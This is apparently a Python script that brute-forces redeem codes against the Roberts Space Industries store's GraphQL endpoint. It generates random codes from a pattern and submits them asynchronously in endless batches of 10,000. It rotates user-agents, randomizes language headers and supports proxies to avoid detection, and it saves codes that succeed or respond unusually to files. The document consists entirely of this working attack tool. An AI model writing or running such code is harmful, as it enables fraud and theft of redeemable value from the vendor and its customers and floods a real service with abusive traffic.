import asyncio
import aiohttp
import time
import rstr
import os
import random
import datetime
import tqdm.asyncio
import json
from typing import Optional
from secrets_local import payload as secret_payload


def loadFile(file):
    file_path = os.path.join(os.path.dirname(
        os.path.realpath(__file__)), file)
    with open(file_path) as fh:
        return fh.read().splitlines()


BASE_URL = "https://robertsspaceindustries.com"
CODE_REGEX = r'([A-Z0-9]{4}-){3}([A-Z0-9]{4})'
USERAGENTS = loadFile("useragents.txt")
SUCCESSFUL_RESPONSE_FILE = "successful-codes.txt"
OUTLIER_RESPONSE_FILE = "outlier-codes.txt"

payload = secret_payload


def RandomHeader() -> json:
    headers = {
        "referer": BASE_URL + "/pledge/redeem-code",
        "origin": BASE_URL,
    }

    headers["user-agent"] = random.choice(USERAGENTS)
    headers["Accept-Language"] = random.choice(
        [f"en-US,en;q={random.uniform(0.5, 0.9):.1f}", f"en-GB,en;q={random.uniform(0.5, 0.9):.1f},*;q={random.uniform(0.5, 0.9):.1f}"])
    return headers


def GenerateUniqueCode(regex: str) -> str:
    code = rstr.xeger(f'{regex}')
    return code


async def on_request_start(session: aiohttp.ClientSession, trace_config_ctx, params):
    print("Starting %s request for %s. I will send: %s" %
          (params.method, params.url, params.headers))
    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    for key, cookie in cookies.items():
        print((key, cookie))


async def on_request_end(session: aiohttp.ClientSession, trace_config_ctx, params):
    print("Ending %s request for %s. I sent: %s" %
          (params.method, params.url, params.response.request_info.headers))
    cookies = session.cookie_jar.filter_cookies(BASE_URL)
    for key, cookie in cookies.items():
        print((key, cookie))


async def postRequest(url: str, session: aiohttp.ClientSession, proxy=Optional[str], headers={}, json={}):
    try:
        async with session.post(url, headers=headers, proxy=proxy, json=json) as response:
            return await response.json()
    except Exception as e:
        print("Something went wrong:", e)


async def trySimulateRedeem(session: aiohttp.ClientSession, proxy=Optional[str]):
    code = GenerateUniqueCode(CODE_REGEX)
    payload["variables"]["query"]["code"] = code
    response = await postRequest(BASE_URL + "/graphql", session, proxy, headers=RandomHeader(), json=payload)
    try:
        error_message = response["errors"][0]["message"]
        store = response["data"]["store"]["redeem"]
        if store is not None:
            with open(OUTLIER_RESPONSE_FILE, "a") as f:
                f.write(f'{code} - {store}\n')
            print("Interresting Code Found -", code)
        elif error_message:
            if error_message != "ErrValidationFailed":
                with open(OUTLIER_RESPONSE_FILE, "a") as f:
                    f.write(f'{code} - {error_message}\n')
                print("Interresting Code Found -", code)
        else:
            print("Success", "-", code)
            with open(SUCCESSFUL_RESPONSE_FILE, "a") as f:
                f.write(f'{code}\n')
    except Exception as e:
        print("Unexpected Exception", "-", code)
        with open(OUTLIER_RESPONSE_FILE, "a") as f:
            f.write(f'{code} - {e}\n')


async def work(num: int, proxy: str = None):
    # trace_config = aiohttp.TraceConfig()
    # trace_config.on_request_start.append(on_request_start)
    # trace_config.on_request_end.append(on_request_end)
    # async with aiohttp.ClientSession(trace_configs=[trace_config]) as session:

    async with aiohttp.ClientSession() as session:
        # await asyncio.gather(*[trySimulateRedeem(session) for i in range(num)])
        for f in tqdm.asyncio.tqdm.as_completed([trySimulateRedeem(session, proxy) for i in range(num)]):
            await f

if __name__ == "__main__":
    run = True
    batch_counter = 0
    batch_size = 10000
    start = time.time()
    print("Starting Code testing")
    while (run):
        try:
            asyncio.run(work(batch_size))
            batch_counter += 1
        except KeyboardInterrupt:
            run = False
    stop = time.time()
    timing = datetime.timedelta(seconds=(stop-start))
    print("Tried {} complete batches with size of {} codes in {}".format(
        batch_counter, batch_size, timing))
